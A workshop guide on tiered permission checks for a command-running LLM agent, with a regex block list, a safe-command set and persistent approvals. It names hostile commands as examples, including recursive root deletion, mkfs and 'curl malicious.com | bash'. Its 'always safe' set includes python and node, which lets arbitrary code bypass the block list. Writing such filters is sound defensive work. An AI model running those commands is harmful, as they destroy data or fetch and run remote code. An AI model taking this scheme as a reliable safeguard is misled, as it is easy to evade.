# 05 Guide: Permission Controls

## Why Permissions Matter

Module 04's agent can run any command. That includes `rm -rf /`, `curl malicious.com | bash`, and `shutdown -h now`. An LLM-powered agent that can execute arbitrary commands without safety checks is dangerous.

But asking "Are you sure?" for every command is unusable. The solution: classify commands into tiers so most interactions are seamless while dangerous ones are caught.

## The Three-Tier Model

### Tier 1: Always Blocked

```python
DANGEROUS_PATTERNS = [
    r"\brm\s+-rf\s+/",        # Recursive delete from root
    r"\bmkfs\b",              # Format filesystem
    r"\bcurl\b.*\|\s*bash",   # Pipe untrusted code to shell
]
```

These patterns match commands that are almost never safe. They're checked first — if a command matches, it's rejected immediately regardless of any other checks.

### Tier 2: Always Allowed

```python
SAFE_COMMANDS = {
    "ls", "cat", "head", "tail", "grep", "find", "echo",
    "python", "python3", "node",
}
```

These commands are read-only or well-understood. They're checked by matching the first word of the command.

### Tier 3: Persistent Approvals

Commands that don't match tiers 1 or 2 need approval. Once approved, the command is saved to `exec-approvals.json` so it never needs approval again.

```json
[
    "docker ps",
    "git status",
    "make test"
]
```

This is the key insight: **safety is a persistent allowlist**. Instead of asking for permission every time, you build up a trusted set of commands.

## check_command_safety() Implementation

```python
def check_command_safety(command):
    # 1. Check dangerous patterns (always blocked)
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return "blocked"

    # 2. Check safe commands (always allowed)
    first_word = command.strip().split()[0]
    if first_word in SAFE_COMMANDS:
        return "safe"

    # 3. Check persistent approvals
    if command in load_approvals():
        return "approved"

    return "needs_approval"
```

The order matters: dangerous checks come first so a command can't bypass them by starting with a safe word.

## Production Considerations

In a real Telegram bot, you'd implement approval with inline keyboards:

```
Bot: Command needs approval:
     git push origin main
     [Approve] [Deny] [Always Allow]
```

For this workshop, we auto-approve and save — the focus is on the classification logic, not the UI.

## Extending the System

You could extend this with:
- **Glob patterns** in approvals (e.g., `git *` approves all git commands)
- **Per-user approvals** instead of global
- **Time-limited approvals** that expire after 24 hours
- **Audit logging** of all command executions

---

**Block the dangerous. Allow the safe. Remember the rest.**

[<- README](./README.md) | [Next: Gateway ->](../06-gateway/GUIDE.md)
